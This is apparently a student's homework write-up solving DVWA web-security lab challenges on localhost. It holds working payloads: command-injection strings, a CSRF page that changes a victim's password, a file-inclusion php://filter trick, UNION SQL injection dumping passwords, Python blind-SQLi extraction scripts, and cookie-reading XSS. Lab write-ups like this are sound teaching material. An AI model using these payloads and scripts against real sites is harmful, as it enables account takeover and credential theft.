**Coverage**	 Web Security: SQL Injection, CSRF, XSS, etc.  <br />**Due**			 April 15, 2022


### 1 Command Injection
Ref. RCE, Remote Command Execute: [https://blog.csdn.net/qq_43814486/article/details/90020139](https://blog.csdn.net/qq_43814486/article/details/90020139)
![image.png](./assets/1647936086901-8e0eeadd-bd19-4242-b076-37454dbb3f54.png)
The php just puts the command _ping + target_ into shell and returns the result. So if we generate commands like `ping 1.1.1.1 && dir`, we can do something after the ping is done and get the output.<br />(Or use `ping 1.1.1.1 & dir`, where the latter command will be run no matter the 

Ref. Find user name: [https://support.logmeininc.com/central/help/how-do-i-find-my-windows-user-name](https://support.logmeininc.com/central/help/how-do-i-find-my-windows-user-name)
![image.png](./assets/1647935888711-8780a59e-a3b3-43fd-8c41-298744a13d97.png)
Ref. Find hostname: [https://jingyan.baidu.com/article/ff42efa9ffad1ac19e22029a.html](https://jingyan.baidu.com/article/ff42efa9ffad1ac19e22029a.html)
![image.png](./assets/1647935829524-9bb9ca64-77f9-4996-9f70-e336ff41f569.png)
I tried `127.0.0.1 && net user` but it returns nothing but the result of ping, which is different when I test in the cmd:
![image.png](./assets/1647937767749-1ddfc1aa-6f6d-4ec8-8beb-c32ef201fc60.png)
![image.png](./assets/1647937784923-98676d0c-1608-409d-9d53-7c8324e63fc7.png)
When I try `127.0.0.1 && net user && ipconfig`, it turns out like:
![image.png](./assets/1647937810645-6e4a8e3f-145c-477c-84b4-e6ee609543e4.png)
But `127.0.0.1 && net user & ipconfig` turns out like:
![image.png](./assets/1647937837334-18c441ee-d087-456b-a6ca-1b2c6fed391b.png)
Which shows that there is an error when running `net user`, but I can't find the error...


### 2  CSRF (Cross-Site Request Forgery)  
We can see the source or try to change the password. We can find that the source checks whether `pass_new` matches `pass_conf`and uses `dvwaCurrentUser()` to get the current user to change the password in the database, checking nothing about the cookies. 

So if we let a user (shortly after testing credentials) click a link like `http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=0&password_conf=0&Change=Change#`, we can change his/her password to `0`.

For example, we can write a HTML like this, and send it to the user:
```html
<!DOCTYPE HTML>
<html>
  <head>
    <meta charset = "utf-8">
    <title>盗号网页</title>
  </head>
  <body>
    <img src="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=xyx&password_conf=xyx&Change=Change#" alt="">
	<a href="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=xyx&password_conf=xyx&Change=Change#">不要点</a>
  </body>
</html>
```
Here, when the browser tries to access the img, it will send a GET request to the src, which is actually changing the password to `xyx`. Also, if the user click the link, it will perform the same action.

Before accessing this webpage, the database is like:
![image.png](./assets/1647940141485-4658ac1d-a3ee-41ac-993b-3c56f99b91de.png)
After accessing it:
![image.png](./assets/1647940332197-755b8ce9-f9b5-4f9e-9e01-25abdd43767c.png)


### 3 File Inclusion
We try to access the following URL:<br />`127.0.0.1/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php`

And we can get the result below, which is not complete:
![image.png](./assets/1648110844402-408139a3-7260-4b81-bfdf-e4f624eb1a24.png)

We try to use `php://filter` (ref: [https://blog.csdn.net/destiny1507/article/details/82347371](https://blog.csdn.net/destiny1507/article/details/82347371))
`http://127.0.0.1/DVWA/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../../hackable/flags/fi.php`, and we can get a string, which is base64 encoded source code of fi.php:
![image.png](./assets/1648222731636-6aa36d7d-4ae5-4f1f-b61b-b50815c3a1d3.png)

Decode it:![image.png](./assets/1648222824813-c078b7c1-ff14-4604-b4f9-d2280b321b85.png)
And we can get the php source code, which has the 5 quotes in it:
```php
<?php

if( !defined( 'DVWA_WEB_PAGE_TO_ROOT' ) ) {
	exit ("Nice try ;-). Use the file include next time!");
}

?>

1.) Bond. James Bond

<?php

echo "2.) My name is Sherlock Holmes. It is my business to know what other people don't know.\n\n<br /><br />\n";

$line3 = "3.) Romeo, Romeo! Wherefore art thou Romeo?";
$line3 = "--LINE HIDDEN ;)--";
echo $line3 . "\n\n<br /><br />\n";

$line4 = "NC4pI" . "FRoZSBwb29s" . "IG9uIH" . "RoZSByb29mIG1" . "1c3QgaGF" . "2ZSBh" . "IGxlY" . "Wsu";
echo base64_decode( $line4 );

?>

<!-- 5.) The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons. -->

```


### 4  File Upload 
```php
<?php echo "I'm Saltyfish Xuan!"; ?>
  
```
We can directly upload the file, and we can know its location:
![image.png](./assets/1648225797582-458976c7-e952-4690-8f4b-89d65843bee0.png)
And we can simply access it:<br />`127.0.0.1/DVWA/hackable/uploads/t4.php`
![image.png](./assets/1648225847665-9dd7517d-548f-4cf8-97a6-43e1fb1e56ba.png)

### 5 SQL Injection
From the source code we can know that, if we input<br />`1' union SELECT first_name, password as last_name FROM users WHERE '1'='1`, <br />the query will be:<br />`SELECT first_name, last_name FROM users WHERE user_id = '1' union SELECT first_name, password as last_name FROM users WHERE '1'='1'`<br />Which can get the following outcome:
![image.png](./assets/1648226191574-510d9a73-261e-42dd-822d-3eb4a06319ee.png)


### 6  SQL Injection (Blind)  
Ref: [https://www.jianshu.com/p/757626cec742](https://www.jianshu.com/p/757626cec742) mentions a method to manually test the length or value of fields. For example, the following query can show whether the length is 32 by the existance of the outcome.<br />`SELECT first_name, last_name FROM users WHERE user_id = 'x' or length(select password from users limit 1, 1) = 32`

But this is too complicated! So I wrote a script:
```python
#coding:utf-8
from urllib.request import *
 
headers = {
    'Connection':'keep-alive', 
    'Cookie':'PHPSESSID=e9p4r3ebqh1k6k6bpgtmejfek9; security=low'
}
#构造请求
for i in range(0, 5):
    for len in range(100):
        url = f"http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=x'or+length(substr((select+password+from+users+limit+{i},+1),1))+%3D+{len}%23&Submit=Submit#"
        try:
            request = Request(url = url, headers = headers)
            response = urlopen(request).read()
            #print(response)
            if response.find(b'MISSING') == -1:
                print(f"The length of user {i}'s password is {len}")
                break
        except:
            pass
```
The Cookie is from my browser.

I noticed that when the result is MISSING, the status will be 404, so I catch the exceptions. The outcome is like this:
![image.png](./assets/1648231217394-13bb8b24-84ec-417c-9135-c5bc61049a83.png)

Next, we can guess the ascii of each char of the password:
```cpp
#coding:utf-8
from urllib.request import *
 
headers = {
    'Connection':'keep-alive', 
    'Cookie':'PHPSESSID=e9p4r3ebqh1k6k6bpgtmejfek9; security=low'
}
#构造请求
for i in range(0, 5):
    for len in range(100):
        url = f"http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=x'or+length(substr((select+password+from+users+limit+{i},+1),1))+%3D+{len}%23&Submit=Submit#"
        try:
            request = Request(url = url, headers = headers)
            response = urlopen(request).read()
            #print(response)
            if response.find(b'MISSING') == -1:
                print(f"The length of user {i}'s password is {len}")
                for j in range(0, len):
                    for k in range(48, 123):
                        url2 = f"http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=x'or+ascii(substr((select+password+from+users+limit+{i},+1),{j+1},1))+%3D+{k}%23&Submit=Submit#"
                        try:
                            request = Request(url = url2, headers = headers)
                            response = urlopen(request).read()
                            if response.find(b'MISSING') == -1:
                                print(chr(k), end = '')
                                break
                        except:
                            pass
                print('\n')
                break
        except:
            pass
```
And it can get the password of each user (although kind of slow...)
![image.png](./assets/1648231904573-bb9259a0-2180-4643-9bfc-95a7630c1926.png)


### 7  Weak Session IDs 
From the source we can know that, the session ID is just set 0 for the first access, and +1 for each new session, which is easily predicted.


### 8  XSS (DOM)  
`127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English<script>alert(document.cookie)</script>`
![image.png](./assets/1648235162204-3485076d-2dd2-4163-9124-9ad5e14a3fad.png)
We can see that, it just insert the value of `default` into the option, which makes our script run automatically:
![image.png](./assets/1648235287411-305f89fa-e588-4f89-ad2c-59b02a1e58c6.png)
Actually, we can use whatever JS script here.


### 9  XSS (Reflected)  
We can put this into the textbox: `<script>alert(document.cookie)</script>`<br />Or just access this URL: `http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E#`<br />And we can get the cookie:
![image.png](./assets/1648235438711-0cab4cca-4a0c-462e-a0d1-10cf2b9d372c.png)
As the source is trying to print our "name" on the page without any filtering, we can insert JS scripts on it, which is similar to the Problem 8.


### 10 XSS (Stored)  
We can put this into the box:
![image.png](./assets/1648235603575-65139fa8-64d6-4a49-8d25-cc8f7eac692b.png)
Similar to Problem 9, as the webpage is trying to display our message without filtering, it enables us to insert some scripts.
![image.png](./assets/1648235614520-9bb9c650-53e7-407a-a64c-8c61ab983b2a.png)
![image.png](./assets/1648235587949-e897e112-5291-445e-8001-323426dea89a.png)
That is, whenever a webpage is not filtering the input and display it on the webpage, we can find ways to construct some input, which can be recognized as scripts by the browser and do something we want.
